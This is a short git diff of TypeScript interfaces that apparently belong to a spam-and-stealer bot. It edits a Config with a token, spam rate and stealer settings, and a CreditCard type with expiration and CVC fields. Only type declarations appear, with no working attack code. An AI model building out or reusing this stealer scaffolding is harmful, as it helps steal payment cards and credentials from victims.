@@ -1,8 +1,8 @@
 export interface Config {
     token: string,
     prefix: string,
-    ignoreErrors: boolean,
     spamRate: number
+    cli: boolean;
     _stealerConfig: StealerConfig;
 }
 
@@ -27,7 +27,7 @@ export interface StealerConfig {
 }
 
 export interface CreditCard {
-    number: string;
+    id: string;
     expiration: string;
     cvc: string;
 }
